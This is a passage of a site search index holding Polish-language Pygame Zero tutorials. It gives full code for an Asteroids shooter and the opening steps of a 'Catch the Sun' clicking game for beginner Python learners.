nowego aktora reprezentuj\u0105cego asteroid\u0119. Z nazwy grafiki usuniemy liczb\u0119 \\(1\\) pozostawiaj\u0105c sam wyraz asteroid, do kt\u00f3rego dopiszemy nasz\u0105 liczb\u0119 image_id zamienion\u0105 na tekst (str(image_id)).</p> <pre><code>def add_asteroid():\n    image_id = random.randint(1, 4)\n    asteroid = Actor(\"asteroid\" + str(image_id))\n    ...\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/asteroids/#peny-kod_7","title":"Pe\u0142ny kod","text":"<pre><code>import pgzrun\nimport pygame\nimport random\n\nWIDTH = 600\nHEIGHT = 900\n\nship = Actor(\"ship\")\nship.x = WIDTH / 2\nship.y = HEIGHT - 60\nship.vx = 5\nship.points = 0\nship.lifes = 3\nship.ammunition = 5\n\nasteroids_list = []\nlasers_list = []\n\ndef draw():\n    screen.blit(\"bg\", (0, 0))\n    for asteroid in asteroids_list:\n        asteroid.draw()\n\n    for laser in lasers_list:\n        laser.draw()\n\n    ship.draw()\n    screen.draw.text(str(ship.points), center=(WIDTH / 2, 20), fontsize=50, color=\"yellow\")\n    draw_lifes()\n    if ship.lifes &lt;= 0:\n        screen.draw.text(\"GAME OVER\", center=(WIDTH / 2, HEIGHT / 2), fontsize=90, color=\"yellow\")\n\ndef draw_lifes():\n    for life_id in range(1, ship.lifes + 1):\n        life = Actor(\"life\")\n        life.x = life_id * life.width\n        life.y = life.height / 2\n        life.draw()\n\ndef update():\n    if ship.lifes &lt;= 0:\n        return\n\n    mouse_x, mouse_y = pygame.mouse.get_pos()\n    if mouse_x &lt; ship.x:\n        ship.x -= ship.vx\n\n    if mouse_x &gt; ship.x:\n        ship.x += ship.vx\n\n    if random.random() &lt; 0.02:\n        add_asteroid()\n\n    update_asteroids()\n    update_lasers()\n    update_lasers_hits()\n\ndef update_asteroids():\n    for asteroid in asteroids_list[:]:\n        asteroid.y += asteroid.vy\n        if asteroid.y &gt; HEIGHT + 50:\n            asteroids_list.remove(asteroid)\n        elif asteroid.colliderect(ship):\n            ship.lifes -= 1\n            asteroids_list.remove(asteroid)\n            if ship.lifes &gt; 0:\n                sounds.shield.play()\n            else:\n                sounds.explosion.play()\n\ndef update_lasers():\n    for laser in lasers_list[:]:\n        laser.y += laser.vy\n        if laser.y &lt; -laser.height:\n            lasers_list.remove(laser)\n\ndef update_lasers_hits():\n    for laser in lasers_list[:]:\n        for asteroid in asteroids_list[:]:\n            if laser.colliderect(asteroid):\n                lasers_list.remove(laser)\n                asteroids_list.remove(asteroid)\n                ship.points += 1\n                break\n\ndef add_asteroid():\n    image_id = random.randint(1, 4)  # Losujemy numer grafiki asteroidy\n    asteroid = Actor(\"asteroid\" + str(image_id))  # Tworzymy nowego aktora na podstawie losowej grafiki asteroidy\n    asteroid.x = random.randint(20, WIDTH-20)\n    asteroid.y = -10\n    asteroid.vy = random.randint(2, 10)\n    asteroids_list.append(asteroid)\n\ndef add_laser():\n    laser = Actor(\"laser\")\n    laser.pos = ship.pos\n    laser.vy = -8\n    lasers_list.append(laser)\n\ndef on_mouse_down(pos):\n    if ship.ammunition &lt;= 0:\n        return\n\n    add_laser()\n    sounds.laser.play()\n    ship.ammunition -= 1\n    clock.schedule(regenerate_ammo, 1)\n\ndef regenerate_ammo():\n    ship.ammunition += 1\n\npygame.mouse.set_visible(False)  # Ukrywamy wska\u017anik myszy\n\nmusic.play(\"space\")  # Odtwarzamy muzyk\u0119 w grze\nmusic.set_volume(0.3)  # Ustawiamy g\u0142o\u015bno\u015b\u0107 muzyki\n\npgzrun.go()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/asteroids/#pena-gra","title":"Pe\u0142na gra","text":"<p>Nasza gra jest ju\u017c gotowa, a jej pe\u0142en kod pokazany jest poni\u017cej.</p>"},{"location":"learning-by-games/python/pygame-zero/asteroids/#peny-kod_8","title":"Pe\u0142ny kod","text":"<pre><code>import pgzrun\nimport pygame\nimport random # Biblioteka do liczb losowych\n\nWIDTH = 600  # Ustawiamy szeroko\u015b\u0107 okna gry\nHEIGHT = 900  # Ustawiamy wysoko\u015b\u0107 okna gry\n\nship = Actor(\"ship\")  # Tworzymy nowego aktora reprezentuj\u0105cego statek\nship.x = WIDTH / 2  # Ustawiamy pozycj\u0119 poziom\u0105 statku na po\u0142ow\u0119 szeroko\u015bci ekranu\nship.y = HEIGHT - 60  # Ustawiamy statek na dole ekranu, z niewielkim marginesem\nship.vx = 5  # Zapami\u0119tujemy pr\u0119dko\u015b\u0107 poziom\u0105 statku\nship.points = 0  # Zapami\u0119tujemy liczb\u0119 zdobytych punkt\u00f3w\nship.lifes = 3  # Zapami\u0119tujemy liczb\u0119 dost\u0119pnych \u017cy\u0107\nship.ammunition = 5  # Liczba dost\u0119pnej amunicji\n\nasteroids_list = []  # Lista, w kt\u00f3rej zapisujemy wszystkie asteroidy\nlasers_list = []  # Lista, w kt\u00f3rej zapisujemy wszystkie lasery\n\ndef draw():  # Funkcja rysuj\u0105ca elementy gry\n    screen.blit(\"bg\", (0, 0))  # Rysujemy t\u0142o gry\n    for asteroid in asteroids_list:  # Przechodzimy p\u0119tl\u0105 przez wszystkie asteroidy\n        asteroid.draw()  # Rysujemy asteroid\u0119 na ekranie gry\n\n    for laser in lasers_list:  # Przechodzimy przez wszystkie lasery na li\u015bcie\n        laser.draw()  # Rysujemy laser na ekranie gry\n\n    ship.draw()  # Rysujemy statek na ekranie\n    screen.draw.text(str(ship.points), center=(WIDTH / 2, 20), fontsize=50, color=\"yellow\")  # Wy\u015bwietlamy liczb\u0119 zdoboytych punkt\u00f3w na ekranie gry\n    draw_lifes()  # Rysujemy \u017cycia na ekranie\n    if ship.lifes &lt;= 0:  # Je\u017celi sko\u0144czy\u0142y nam si\u0119 \u017cycia\n        screen.draw.text(\"GAME OVER\", center=(WIDTH / 2, HEIGHT / 2), fontsize=90, color=\"yellow\")  # Wy\u015bwietlamy napis \"GAME OVER\" na \u015brodku ekranu gry\n\ndef draw_lifes():  # Pomocnicza funkcja rysuj\u0105ca \u017cycia\n    for life_id in range(1, ship.lifes + 1):  # Przechodzimy p\u0119tl\u0105 od jeden do liczby dost\u0119pnych \u017cy\u0107 w\u0142\u0105cznie\n        life = Actor(\"life\")  # Tworzymy aktora reprezentuj\u0105cego \u017cycie\n        life.x = life_id * life.width  # Ustawiamy pozycj\u0119 poziom\u0105 aktora\n        life.y = life.height / 2  # Ustawiamy pozycj\u0119 aktora w pionie\n        life.draw()  # Rysujemy \u017cycie na ekranie\n\ndef update():  # Funkcja aktualizuj\u0105ca elementy gry\n    if ship.lifes &lt;= 0:  # Je\u017celi sko\u0144czy\u0142y nam si\u0119 \u017cycia\n        return  # Ko\u0144czymy dzia\u0142anie funkcji\n\n    mouse_x, mouse_y = pygame.mouse.get_pos()  # Odczytujemy obecn\u0105 pozycj\u0119 wska\u017anika myszy\n    if mouse_x &lt; ship.x:  # Je\u017celi wska\u017anik myszy jest z lewej strony statku\n        ship.x -= ship.vx  # Przemieszczamy statek w lewo zgodnie z jego pr\u0119dko\u015bci\u0105\n\n    if mouse_x &gt; ship.x:  # Je\u017celi wska\u017anik myszy jest z prawej strony statku\n        ship.x += ship.vx  # Przemieszczamy statek w prawo zgodnie z jego pr\u0119dko\u015bci\u0105\n\n    if random.random() &lt; 0.02:  # Je\u017celi wylosowali\u015bmy odpowiednio ma\u0142\u0105 liczb\u0119\n        add_asteroid()  # Dodajemy now\u0105 asteroid\u0119 do gry\n\n    update_asteroids()  # Aktualizujemy pozycje asteroid\n    update_lasers()  # Aktualizujemy pozycje laser\u00f3w\n    update_lasers_hits()  # Aktualizujemy trafienia laser\u00f3w w asteroidy\n\ndef update_asteroids():  # Pomocnicza funkcja aktualizuj\u0105ca pozycj\u0119 asteroid\n    for asteroid in asteroids_list[:]:  # Przechodzimy przez kopi\u0119 listy asteroid\n        asteroid.y += asteroid.vy  # Przemieszczamy asteroid\u0119 zgodnie z jej pr\u0119dko\u015bci\u0105\n        if asteroid.y &gt; HEIGHT + 50:   # Je\u017celi asteroida wylecia\u0142a poza ekran\n            asteroids_list.remove(asteroid)  # Usuwamy j\u0105 z listy asteroid\n        elif asteroid.colliderect(ship):  # Sprawdzamy, czy asteroida zderzy\u0142a si\u0119 ze statkiem\n            ship.lifes -= 1  # Zmniejszamy liczb\u0119 pozosta\u0142ych \u017cy\u0107\n            asteroids_list.remove(asteroid)  # Usuwamy asteroid\u0119 z gry\n            if ship.lifes &gt; 0:  # Je\u017celi pozosta\u0142y jeszcze jakie\u015b \u017cycia\n                sounds.shield.play()  # Odtwarzamy d\u017awi\u0119k tarczy\n            else:  # W przeciwnym przypadku, gdy \u017cycia si\u0119 ju\u017c sko\u0144czy\u0142y\n                sounds.explosion.play()  # Odtwarzamy d\u017awi\u0119k wybuchu\n\ndef update_lasers():  # Pomocnicza funkcja aktualizuj\u0105ca pozycje laser\u00f3w\n    for laser in lasers_list[:]:  # Przechodzimy przez wszystkie lasery na li\u015bcie\n        laser.y += laser.vy  # Przemieszczamy laser zgodnie z jego pr\u0119dko\u015bci\u0105\n        if laser.y &lt; -laser.height:  # Je\u017celi laser wylecia\u0142 poza ekran\n            lasers_list.remove(laser)  # Usuwamy laser z gry\n\ndef update_lasers_hits():  # Pomocnicza funkcja sprawdzaj\u0105ca uderzenia laser\u00f3w w asteroidy\n    for laser in lasers_list[:]:  # Przechodzimy przez wszystkie lasery na li\u015bcie\n        for asteroid in asteroids_list[:]:  # Przechodzimy przez wszystkie asteroidy na li\u015bcie\n            if laser.colliderect(asteroid):  # Sprawdzamy, czy laser trafi\u0142 w asteroid\u0119\n                lasers_list.remove(laser)  # Usuwamy laser z gry\n                asteroids_list.remove(asteroid)  # Usuwamy asteroid\u0119 z gry\n                ship.points += 1  # Zwi\u0119kszamy liczb\u0119 punkt\u00f3w po zestrzeleniu asteroidy\n                break  # Ko\u0144czymy p\u0119tl\u0119 przechodz\u0105c\u0105 po asteroidach i przechodzimy do kolejnego lasera\n\ndef add_asteroid():   # Pomocnicza funkcja dodaj\u0105ca now\u0105 asteroid\u0119 do gry\n    image_id = random.randint(1, 4)  # Losujemy numer grafiki asteroidy\n    asteroid = Actor(\"asteroid\" + str(image_id))  # Tworzymy nowego aktora na podstawie losowej grafiki asteroidy\n    asteroid.x = random.randint(20, WIDTH - 20)  # Ustawiamy losow\u0105 pozycj\u0119 poziom\u0105 asteroidy\n    asteroid.y = -10  # Ustawiamy pionow\u0105 pozycj\u0119 asteroidy tak, by by\u0142a poza ekranem gry\n    asteroid.vy = random.randint(2, 10)  # Ustawiamy losow\u0105 pozycj\u0119 asteroidy\n    asteroids_list.append(asteroid)  # Dodajemy now\u0105 asteroid\u0119 do listy asteroid\n\ndef add_laser():  # Pomocnicza funkcja dodaj\u0105ca nowy laser do gry\n    laser = Actor(\"laser\")  # Tworzymy nowego aktora reprezentuj\u0105cego laser\n    laser.pos = ship.pos  # Ustawiamy pozycj\u0119 lasera na pozycj\u0119 statku\n    laser.vy = -8  # Ustawiamy pr\u0119dko\u015b\u0107 lasera\n    lasers_list.append(laser)  # Dodajemy laser do listy laser\u00f3w\n\ndef on_mouse_down(pos):  # Funkcja odczytuj\u0105ca klikni\u0119cia myszy\n    if ship.ammunition &lt;= 0:  # Je\u017celi nie mamy ju\u017c amunicji\n        return  # Ko\u0144czymy dzia\u0142anie funkcji, w ten spos\u00f3b nie oddaj\u0105c ju\u017c strza\u0142u\n\n    add_laser()  # Dodajemy nowy laser do gry\n    sounds.laser.play()  # Odtwarzamy d\u017awi\u0119k oddania strza\u0142u\n    ship.ammunition -= 1  # Zmniejszamy liczb\u0119 pozosta\u0142ej amunicji o jeden\n    clock.schedule(regenerate_ammo, 1)  # Ustawiamy wywo\u0142anie regeneracji amunicji po up\u0142yni\u0119ciu jednej sekundy\n\ndef regenerate_ammo():  # Pomocnicza funkcja regeneruj\u0105ca amunicj\u0119\n    ship.ammunition += 1  # Regenerujemy amunicj\u0119 dodaj\u0105c warto\u015b\u0107 1 do zmiennej ammunition zapisanej w statku\n\npygame.mouse.set_visible(False)  # Ukrywamy wska\u017anik myszy\n\nmusic.play(\"space\")  # Odtwarzamy muzyk\u0119 w grze\nmusic.set_volume(0.3)  # Ustawiamy g\u0142o\u015bno\u015b\u0107 muzyki\n\npgzrun.go()  # Uruchamiamy gr\u0119\n</code></pre> <p>Pe\u0142na implementacja dost\u0119pna jest r\u00f3wnie\u017c poni\u017cej.</p> <p>Asteroidy</p>"},{"location":"learning-by-games/python/pygame-zero/asteroids/#zadanie-dodatkowe","title":"Zadanie dodatkowe","text":"<p>Spr\u00f3buj doda\u0107 do gry zwi\u0119kszanie liczby \u017cy\u0107, gdy zdob\u0119dziemy odpowiedni\u0105 liczb\u0119 punkt\u00f3w. Np. ka\u017cde \\(100\\) punkt\u00f3w daje nam kolejne \u017cycie. Podobnie mo\u017cesz zrobi\u0107 z amunicj\u0105.</p>"},{"location":"learning-by-games/python/pygame-zero/catch-the-sun/","title":"Z\u0142ap s\u0142o\u0144ce","text":""},{"location":"learning-by-games/python/pygame-zero/catch-the-sun/#wstep","title":"Wst\u0119p","text":"<p>Ka\u017cdy potrzebuje witaminy D, z\u0142apmy wi\u0119c troch\u0119 s\u0142o\u0144ca! Nie jest to jednak tak proste, jakby si\u0119 mog\u0142o wydawa\u0107! S\u0142o\u0144ce nagle znika i pojawia si\u0119 w losowych miejscach. Za ka\u017cde celne klikni\u0119cie w s\u0142o\u0144ce dostajemy punkt, a za ka\u017cde pud\u0142o tracimy punkt! Im wi\u0119cej mamy punkt\u00f3w, tym s\u0142o\u0144ce szybciej si\u0119 porusza! Ile punkt\u00f3w uda Ci si\u0119 zdoby\u0107?</p>"},{"location":"learning-by-games/python/pygame-zero/catch-the-sun/#czego-sie-nauczysz","title":"Czego si\u0119 nauczysz","text":"<ul> <li>Jak doda\u0107 i narysowa\u0107 posta\u0107 w grze: aktora.</li> <li>Jak zmienia\u0107 pozycj\u0119 aktora na ekranie.</li> <li>Jak odczytywa\u0107 klikni\u0119cia myszy i wykrywa\u0107 ich kolizj\u0119 z aktorem.</li> <li>Jak wy\u015bwietla\u0107 i zlicza\u0107 punkty.</li> </ul>"},{"location":"learning-by-games/python/pygame-zero/catch-the-sun/#materiay-do-pobrania","title":"Materia\u0142y do pobrania","text":""},{"location":"learning-by-games/python/pygame-zero/catch-the-sun/#grafiki","title":"Grafiki","text":"<p>Pobieramy poni\u017csz\u0105 grafik\u0119: klikamy prawym przyciskiem myszy i wybieramy Zapisz obraz jako. Zapisujemy obraz w wybranym przez siebie miejscu i nazywamy sun.png. Grafik\u0119 umieszczamy w katalogu images w naszym projekcie. W celu utworzenia katalogu klikamy prawym przyciskiem myszy na g\u0142\u00f3wny katalog projektu, a nast\u0119pnie wybieramy New -&gt; Directory. Teraz wystarczy przeci\u0105gn\u0105\u0107 nasze s\u0142o\u0144ce do katalogu images i zatwierdzi\u0107 zmiany klikaj\u0105c niebieski przycisk z napisem Refactor.</p> <p></p> <p>Warning</p> <p>Wszystkie grafiki, z kt\u00f3rych b\u0119dziemy korzysta\u0107 w naszej grze, powinny znale\u017a\u0107 si\u0119 w katalogu images, inaczej biblioteka nie znajdzie tych grafik.  Ponadto nazwy grafik nie mog\u0105 zawiera\u0107 wielkich liter.</p>"},{"location":"learning-by-games/python/pygame-zero/catch-the-sun/#podstawowy-szablon","title":"Podstawowy szablon","text":"<p>Zaczynamy od utworzenia podstawowego szablonu naszej gry. Je\u015bli jeszcze tego nie zrobili\u015bmy, jest to tak\u017ce dobry moment na utworzenie nowego projektu.  Mo\u017cemy go nazwa\u0107 np. ZlapSlonce (bez polskich znak\u00f3w).  Instalujemy tak\u017ce bibliotek\u0119 pgzero i tworzymy plik main.py (je\u017celi nie zosta\u0142 utworzony automatycznie). Pobieramy tak\u017ce pokazan\u0105 wy\u017cej grafik\u0119 s\u0142o\u0144ca i umieszczamy j\u0105 w katalogu images wewn\u0105trz naszego projektu.</p>"},{"location":"learning-by-games/python/pygame-zero/catch-the-sun/#importujemy-biblioteki","title":"Importujemy biblioteki","text":"<p>Zastan\u00f3wmy si\u0119, jakich \"narz\u0119dzi\" b\u0119dziemy potrzebowa\u0107. Podstawowym elementem b\u0119dzie oczywi\u015bcie nasza biblioteka do tworzenia gier. Docelowo nasze s\u0142o\u0144ce b\u0119dzie si\u0119 pojawia\u0142o w losowych miejscach na ekranie, przyda nam si\u0119 tak\u017ce biblioteka do liczb losowych. </p> <p>Dodajemy wi\u0119c odpowiednie polecenia na samym pocz\u0105tku pliku main.py w edytorze:</p> <pre><code>import pgzrun\nimport random\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/catch-the-sun/#okreslamy-wymiary-okna-gry","title":"Okre\u015blamy wymiary okna gry","text":"<p>Nasza gra nie musi mie\u0107 du\u017cego okna. Co wi\u0119cej, im mniejsze b\u0119dzie okno gry, tym gra b\u0119dzie \u0142atwiejsza! Dlaczego? S\u0142o\u0144ce b\u0119dzie mia\u0142o mniej miejsca do ucieczki, \u0142atwiej wi\u0119c b\u0119dzie je z\u0142apa\u0107. Zacznijmy wi\u0119c od niewielkiego, do\u015b\u0107 standardowego wymiaru \\(800\\times600\\). W ka\u017cdej chwili mo\u017cemy te wymiary zmieni\u0107.</p> <pre><code>WIDTH = 800\nHEIGHT = 600\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/catch-the-sun/#tworzymy-to","title":"Tworzymy t\u0142o","text":"<p>Nasza gra, jak i ka\u017cda inna, powinna mie\u0107 jakie\u015b t\u0142o. To b\u0119dzie prosta gra, wi\u0119c i niech t\u0142o b\u0119dzie proste: wype\u0142nimy je wybranym przez siebie kolorem. Wype\u0142nienie kolorem umie\u015bcimy w cz\u0119\u015bci rysuj\u0105cej, tzn. w cz\u0119\u015bci <code>draw</code>. Poniewa\u017c s\u0142o\u0144ce zazwyczaj mo\u017cemy zaobserwowa\u0107 na niebieskim niebie, takiego te\u017c koloru u\u017cyjemy. W celu wype\u0142nienia t\u0142a wybranym kolorem skorzystamy z metody <code>screen.fill</code>, do kt\u00f3rej jako argument przeka\u017cemy wybrany kolor za pomoc\u0105 jego angielskiej nazwy skyblue, podanej w formie tekstu:</p> <pre><code>screen.fill(\"skyblue\")\n</code></pre> <p>List\u0119 dost\u0119pnych (nazwanych) kolor\u00f3w mo\u017cna znale\u017a\u0107 tutaj: https://pygame-zero.readthedocs.io/en/latest/colors_ref.html. Zach\u0119cam do sprawdzenia innych kolor\u00f3w i wybrania takiego, kt\u00f3ry Tobie odpowiada. Pami\u0119taj: to Twoja gra!</p> <p>Pe\u0142na implementacja funkcji rysuj\u0105cej wygl\u0105da wi\u0119c nast\u0119puj\u0105co:</p> <pre><code>def draw():\n    screen.fill(\"skyblue\")\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/catch-the-sun/#pozostae-elementy-szablonu","title":"Pozosta\u0142e elementy szablonu","text":"<p>Na koniec pozosta\u0142o nam uzupe\u0142ni\u0107 nasz program o pozosta\u0142e wymagane elementy szablonu, czyli funkcj\u0119 aktualizuj\u0105c\u0105 i polecenie uruchamiaj\u0105ce gr\u0119.</p> <pre><code>def update():\n    pass\n\npgzrun.go()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/catch-the-sun/#peny-program-z-komentarzami","title":"Pe\u0142ny program z komentarzami","text":"<p>Nasza pe\u0142na gra powinna wygl\u0105da\u0107 teraz podobnie, jak pokazano poni\u017cej. Komentarze oczywi\u015bcie s\u0105 opcjonalne, ale pozwalaj\u0105 lepiej zrozumie\u0107, co si\u0119 dzieje w danym miejscu w kodzie.</p> <pre><code># Importujemy bibliotek\u0119 Pygame Zero do tworzenia gier\nimport pgzrun\n# Imporujemy bibliotek\u0119 do liczb losowych\nimport random\n\n# Okre\u015blamy szeroko\u015b\u0107 i wysoko\u015b\u0107 okna gry\nWIDTH = 800\nHEIGHT = 600\n\n# Funkcja rysuj\u0105ca stan gry na ekranie\ndef draw():\n    # Wype\u0142niamy t\u0142o wybranym kolorem\n    screen.fill(\"skyblue\")\n\n# Funkcja aktualizuj\u0105ca stan gry\ndef update():\n    pass\n\n# Uruchamiamy gr\u0119\npgzrun.go()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/catch-the-sun/#testujemy-dziaanie","title":"Testujemy dzia\u0142anie","text":"<p>W tym momencie warto ju\u017c uruchomi\u0107 nasz\u0105 \"gr\u0119\" i sprawdzi\u0107, czy wszystko dzia\u0142a. Na razie powinni\u015bmy zobaczy\u0107 jedynie okno gry wype\u0142nione jasnoniebieskim kolorem, ale od czego\u015b trzeba zacz\u0105\u0107! </p>"},{"location":"learning-by-games/python/pygame-zero/catch-the-sun/#rysowanie-sonca","title":"Rysowanie s\u0142o\u0144ca","text":"<p>Teraz zajmiemy si\u0119 dodaniem do gry naszej g\u0142\u00f3wnej postaci: s\u0142o\u0144ca. Postacie w Pygame Zero reprezentowa\u0107 b\u0119dziemy jako aktor\u00f3w. Ka\u017cdy aktor ma swoje w\u0142a\u015bciwo\u015bci, takie jak grafika czy po\u0142o\u017cenie na ekranie. Aktorzy mog\u0105 te\u017c wchodzi\u0107 w interakcj\u0119 z innymi postaciami (tak\u017ce aktorami) i pozosta\u0142ymi elementami gry.</p>"},{"location":"learning-by-games/python/pygame-zero/catch-the-sun/#tworzymy-nowego-aktora-gry","title":"Tworzymy nowego aktora gry","text":"<p>Zaczniemy od utworzenia naszego nowego aktora: s\u0142o\u0144ca. W tym celu potrzebna nam b\u0119dzie nowa zmienna, w kt\u00f3rej zapami\u0119tamy informacje o aktorze. Zmienn\u0105 nazwiemy sun, czyli s\u0142o\u0144ce po angielsku. Naszego aktora utworzymy zaraz na pocz\u0105tku naszego programu, zaraz pod zdefiniowaniem rozmiar\u00f3w okna gry, a przed cz\u0119\u015bci\u0105 rysuj\u0105c\u0105 draw. W celu utworzenia nowego aktora skorzystamy z polecenia <code>Actor</code>, a jako argument podamy nazw\u0119 grafiki reprezentuj\u0105cej nasze s\u0142o\u0144ce. Pami\u0119taj, \u017ce grafika musi si\u0119 znajdowa\u0107 w katalogu images.</p> <pre><code>sun = Actor(\"sun\")\n</code></pre> <p>Info</p> <p>W nazwie grafiki mo\u017cemy, ale nie musimy podawa\u0107 rozszerzenia, tzn. mogliby\u015bmy r\u00f3wnie dobrze napisa\u0107:</p> <pre><code>sun = Actor(\"sun.png\")\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/catch-the-sun/#rysujemy-sonce-na-ekranie","title":"Rysujemy s\u0142o\u0144ce na ekranie","text":"<p>Gdy ju\u017c utworzyli\u015bmy naszego aktora, czas go narysowa\u0107 na ekranie. W tym celu dodajemy instrukcj\u0119 <code>sun.draw()</code> na ko\u0144cu cz\u0119\u015bci rysuj\u0105cej (<code>draw</code>).</p> <pre><code>def draw():\n    screen.fill(\"skyblue\")\n    sun.draw()\n</code></pre> <p>Info</p> <p>Kolejno\u015b\u0107, w jakiej rysujemy kolejne elementy na ekranie, ma znaczenie. Mo\u017cemy je sobie wyobrazi\u0107 jak kolejne obrazki, kt\u00f3re k\u0142adziemy jeden na drugim. Gdyby\u015bmy najpierw narysowali s\u0142o\u0144ce, a dopiero potem t\u0142o, to niebieski kolor przykry\u0142by naszego aktora.</p>"},{"location":"learning-by-games/python/pygame-zero/catch-the-sun/#peny-program","title":"Pe\u0142ny program","text":"<p>Kod naszej gry prezentuje si\u0119 dot\u0105d tak, jak pokazano poni\u017cej.</p> <pre><code>import pgzrun\nimport random\n\nWIDTH = 800\nHEIGHT = 600\n\n# Tworzymy aktora s\u0142o\u0144ca\nsun = Actor(\"sun\")\n\ndef draw():\n    screen.fill(\"skyblue\")\n    # Rysujemy s\u0142o\u0144ce\n    sun.draw()\n\ndef update():\n    pass\n\npgzrun.go()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/catch-the-sun/#testujemy-dziaanie_1","title":"Testujemy dzia\u0142anie","text":"<p>Uruchamiamy i testujemy! Naszym oczom powinno ukaza\u0107 si\u0119 s\u0142o\u0144ce, umieszczone w lewym g\u00f3rnym rogu okna gry.</p>"},{"location":"learning-by-games/python/pygame-zero/catch-the-sun/#uciekajace-sonce","title":"Uciekaj\u0105ce s\u0142o\u0144ce","text":"<p>W tym momencie nasze s\u0142o\u0144ce jest do\u015b\u0107 statyczne. Chcemy jednak, by zazna\u0142o troch\u0119 ruchu i \"skaka\u0142o\" po ekranie w losowych miejscach.</p>"},{"location":"learning-by-games/python/pygame-zero/catch-the-sun/#przemieszczamy-sonce-w-losowe-miejsce","title":"Przemieszczamy s\u0142o\u0144ce w losowe miejsce","text":"<p>Zacznijmy od przemieszczenia s\u0142o\u0144ca w losowe miejsce. B\u0119dziemy teraz pracowa\u0107 w cz\u0119\u015bci aktualizuj\u0105cej (<code>update</code>), poniewa\u017c nasze s\u0142o\u0144ce powinno si\u0119 przemieszcza\u0107 przez ca\u0142y czas trwania gry. Aby przemie\u015bci\u0107 s\u0142o\u0144ce w inne miejsce na ekranie, powinni\u015bmy zmieni\u0107 jego wsp\u00f3\u0142rz\u0119dne, tzn. parametry <code>sun.x</code> oraz <code>sun.y</code>. Przypiszemy im losowe warto\u015bci korzystaj\u0105c z metody <code>random.randint</code>, do kt\u00f3rej jako parametry przeka\u017cemy przedzia\u0142, z kt\u00f3rego chcemy wylosowa\u0107 warto\u015b\u0107. Musimy pami\u0119ta\u0107, \u017ce wsp\u00f3\u0142rz\u0119dna \\(x\\) powinna si\u0119 mie\u015bci\u0107 w szeroko\u015bci (WIDTH) ekranu, a wsp\u00f3\u0142rz\u0119dna \\(y\\) powinna si\u0119 mie\u015bci\u0107 w wysoko\u015bci (HEIGHT) ekranu. Dodatkowo warto doda\u0107 niewielki margines, powiedzmy \\(80\\) pikseli, tak aby nasze s\u0142o\u0144ce nie wychodzi\u0142o poza brzegi okna gry.</p> <p>W cz\u0119\u015bci aktualizuj\u0105cej (<code>update</code>) usuwamy wi\u0119c instrukcj\u0119 <code>pass</code> i dopisujemy losowanie nowych wsp\u00f3\u0142rz\u0119dnych naszego s\u0142o\u0144ca (pami\u0119taj\u0105c o wci\u0119ciach).</p> <pre><code>def update():\n    sun.x = random.randint(80, WIDTH - 80)\n    sun.y = random.randint(80, HEIGHT - 80)\n</code></pre> <p>Info</p> <p>Domy\u015blnie wsp\u00f3\u0142rz\u0119dne \\(x, y\\) aktora oznaczaj\u0105 po\u0142o\u017cenie jego lewego g\u00f3rnego rogu na ekranie.</p> <p>Gdy teraz uruchomimy nasz\u0105 gr\u0119 zobaczymy, \u017ce s\u0142o\u0144ce faktycznie skacze po ekranie w losowych miejscach. Jest jednak zbyt szybkie, by\u015bmy dali rad\u0119 je z\u0142apa\u0107. Musimy je spowolni\u0107.</p>"},{"location":"learning-by-games/python/pygame-zero/catch-the-sun/#odliczamy-czas","title":"Odliczamy czas","text":"<p>Aby spowolni\u0107 nasze s\u0142o\u0144ce dodamy do niego swego rodzaju timer. Jego zadaniem b\u0119dzie odliczanie w d\u00f3\u0142, a\u017c do zera. Gdy timer dojdzie do zera, to dopiero wtedy przemie\u015bcimy nasze s\u0142o\u0144ce w inne, losowe miejsce i ponownie ustawimy timer. Na pocz\u0105tku dopisujemy timer do naszego s\u0142o\u0144ca, zaraz pod linijk\u0105 w kt\u00f3rej tworzymy aktora. Zaczniemy od warto\u015bci zero, tak aby ju\u017c na samym pocz\u0105tku s\u0142o\u0144ce przemie\u015bci\u0142o si\u0119 w losowe miejsce.</p> <pre><code>sun = Actor(\"sun\")\nsun.timer = 0\n</code></pre> <p>Teraz, w cz\u0119\u015bci aktualizuj\u0105cej, powinni\u015bmy zmniejsza\u0107 nasz timer o jeden w ka\u017cdej klatce gry. Nast\u0119pnie sprawdzimy, czy timer osi\u0105gn\u0105\u0142 warto\u015b\u0107 mniejsz\u0105 lub r\u00f3wn\u0105 zero, a je\u017celi tak, to ustawimy s\u0142o\u0144ce w losowym miejscu (tak jak poprzednio) i ustawimy timer na jak\u0105\u015b ustalon\u0105 z g\u00f3ry warto\u015b\u0107, np \\(60\\). Zak\u0142adaj\u0105c, \u017ce nasza gra b\u0119dzie dzia\u0142a\u0107 w sze\u015b\u0107dziesi\u0119ciu klatkach na sekund\u0119, to warto\u015b\u0107 \\(60\\) b\u0119dzie odpowiada\u0107 jednej sekundzie.</p> <pre><code>def update():\n    sun.timer -= 1\n\n    if sun.timer &lt;= 0:\n        sun.x = random.randint(80, WIDTH - 80)\n        sun.y = random.randint(80, HEIGHT - 80)\n        sun.timer = 60\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/catch-the-sun/#peny-kod","title":"Pe\u0142ny kod","text":"<p>Dotychczasowy kod naszej gry zaprezentowany jest poni\u017cej.</p> <pre><code>import pgzrun\nimport random\n\nWIDTH = 800\nHEIGHT = 600\n\nsun = Actor(\"sun\")\n# Licznik czasu\nsun.timer = 0\n\ndef draw():\n    screen.fill(\"skyblue\")\n    sun.draw()\n\ndef update():\n    # Zmiejszamy licznik czasu\n    sun.timer -= 1\n\n    # Je\u017celi licznik czasu spad\u0142 do zera\n    if sun.timer &lt;= 0:\n        # Wybieramy nowe, losowe wsp\u00f3\u0142rz\u0119dne po\u0142o\u017cenia s\u0142o\u0144ca na ekranie\n        sun.x = random.randint(80, WIDTH - 80)\n        sun.y = random.randint(80, HEIGHT - 80)\n        # Ustalamy pocz\u0105tkow\u0105 warto\u015b\u0107 licznika czasu\n        sun.timer = 60\n\npgzrun.go()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/catch-the-sun/#testujemy-dziaanie_2","title":"Testujemy dzia\u0142anie","text":"<p>Uruchamiamy ponownie i sprawdzamy, czy nasze s\u0142o\u0144ce 